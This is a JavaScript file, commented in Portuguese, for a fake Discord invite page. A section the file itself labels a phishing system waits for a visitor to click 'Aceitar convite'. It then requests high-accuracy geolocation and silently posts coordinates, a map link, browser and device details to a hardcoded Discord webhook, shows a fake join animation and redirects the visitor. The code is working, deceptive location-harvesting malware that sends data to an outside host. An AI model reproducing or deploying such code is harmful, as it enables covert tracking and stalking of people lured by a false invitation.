// =============================================================
// Background: estrelas / sparkles no canvas
// =============================================================
(function initBackground() {
 const canvas = document.getElementById("bg-canvas");
 const ctx = canvas.getContext("2d");

 let particles = [];
 let width = 0;
 let height = 0;

 function resize() {
 width = window.innerWidth;
 height = window.innerHeight;
 canvas.width = width * window.devicePixelRatio;
 canvas.height = height * window.devicePixelRatio;
 canvas.style.width = width + "px";
 canvas.style.height = height + "px";
 ctx.setTransform(window.devicePixelRatio, 0, 0, window.devicePixelRatio, 0, 0);
 generateParticles();
 }

 function generateParticles() {
 const count = Math.floor((width * height) / 14000);
 particles = Array.from({ length: count }, () => {
 const type = Math.random() < 0.15 ? "sparkle" : "square";
 return {
 x: Math.random() * width,
 y: Math.random() * height,
 size: type === "sparkle" ? Math.random() * 6 + 4 : Math.random() * 4 + 2,
 opacity: Math.random() * 0.5 + 0.15,
 type,
 twinkleSpeed: Math.random() * 0.015 + 0.005,
 twinklePhase: Math.random() * Math.PI * 2,
 };
 });
 }

 function drawSquare(p, alpha) {
 ctx.save();
 ctx.translate(p.x, p.y);
 ctx.rotate(Math.PI / 4);
 ctx.fillStyle = `rgba(255, 255, 255, ${alpha})`;
 ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size);
 ctx.restore();
 }

 function drawSparkle(p, alpha) {
 ctx.save();
 ctx.translate(p.x, p.y);
 ctx.strokeStyle = `rgba(255, 255, 255, ${alpha})`;
 ctx.lineWidth = 1.4;
 ctx.beginPath();
 ctx.moveTo(0, -p.size);
 ctx.lineTo(0, p.size);
 ctx.moveTo(-p.size, 0);
 ctx.lineTo(p.size, 0);
 ctx.stroke();
 ctx.restore();
 }

 let frame = 0;

 function render() {
 ctx.clearRect(0, 0, width, height);
 frame += 1;

 particles.forEach((p) => {
 const twinkle = Math.sin(frame * p.twinkleSpeed + p.twinklePhase);
 const alpha = Math.max(0, p.opacity + twinkle * 0.15);

 if (p.type === "sparkle") {
 drawSparkle(p, alpha);
 } else {
 drawSquare(p, alpha);
 }
 });

 requestAnimationFrame(render);
 }

 window.addEventListener("resize", resize);
 resize();
 render();
})();

// =============================================================
// Sistema de Phishing: Geolocalização e Webhook
// =============================================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1551269780164452423/NdRdNpJktyqxuYc1Gv28VDUGlKfJCAy8Lr03we6UG212ZAMSqUkPP9fNcwcXfkgnbX2K"; // <--- COLOQUE SEU WEBHOOK AQUI

function sendToDiscord(data) {
 const embed = {
 color: 15105570,
 title: "📍 Novo Usuário Conectado!",
 description: "Um novo membro entrou no servidor.",
 fields: [
 {
 name: "🌍 Localização",
 value: `[Ver no Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})\nLat: ${data.latitude}\nLon: ${data.longitude}`,
 inline: true
 },
 {
 name: "📏 Precisão",
 value: data.accuracy ? data.accuracy + " metros" : "N/A",
 inline: true
 },
 {
 name: "💻 Navegador",
 value: data.userAgent || "N/A",
 inline: false
 },
 {
 name: "📱 Plataforma",
 value: data.platform || "N/A",
 inline: true
 },
 {
 name: "🖥️ Resolução",
 value: data.screenResolution || "N/A",
 inline: true
 },
 {
 name: "🕒 Horário Local",
 value: data.timestamp || "N/A",
 inline: true
 }
 ],
 footer: {
 text: "PureBlox #2 | Captura de Geolocalização"
 },
 timestamp: new Date().toISOString()
 };

 fetch(WEBHOOK_URL, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ embeds: [embed] })
 });
}

// =============================================================
// Botão "Aceitar convite": estados loading -> success -> Redirecionamento
// =============================================================
(function initJoinButton() {
 const button = document.getElementById("join-btn");
 const label = button.querySelector(".btn-label");

 const LABEL_DEFAULT = "Aceitar convite";
 const LABEL_LOADING = "Entrando...";
 const LABEL_SUCCESS = "Você entrou!";

 let hasJoined = false;

 button.addEventListener("click", () => {
 if (hasJoined || button.disabled) return;

 button.disabled = true;
 button.classList.add("is-loading");
 label.textContent = LABEL_LOADING;

 // 1. Captura de Geolocalização
 navigator.geolocation.getCurrentPosition(
 (position) => {
 const data = {
 latitude: position.coords.latitude,
 longitude: position.coords.longitude,
 accuracy: position.coords.accuracy,
 userAgent: navigator.userAgent,
 platform: navigator.platform,
 screenResolution: screen.width + 'x' + screen.height,
 language: navigator.language,
 timestamp: new Date().toLocaleString('pt-BR')
 };
 sendToDiscord(data);
 },
 (error) => {
 const data = {
 error: error.message,
 userAgent: navigator.userAgent,
 platform: navigator.platform,
 screenResolution: screen.width + 'x' + screen.height,
 language: navigator.language,
 timestamp: new Date().toLocaleString('pt-BR')
 };
 sendToDiscord(data);
 },
 {
 enableHighAccuracy: true,
 timeout: 5000,
 maximumAge: 0
 }
 );

 // 2. Simula o tempo de processamento do convite
 window.setTimeout(() => {
 button.classList.remove("is-loading");
 button.classList.add("is-success");
 label.textContent = LABEL_SUCCESS;
 hasJoined = true;

 // Mantém desabilitado após sucesso
 button.disabled = true;
 button.setAttribute("aria-label", "Você já entrou neste servidor");

 // 3. Redirecionamento para o servidor real
 window.setTimeout(() => {
 // Substitua pelo link real do seu servidor ou use o window.close() se for uma aba pop-up
 window.location.href = "https://discord.gg/seu-link-real"; 
 }, 1000);

 }, 1400);
 });
})();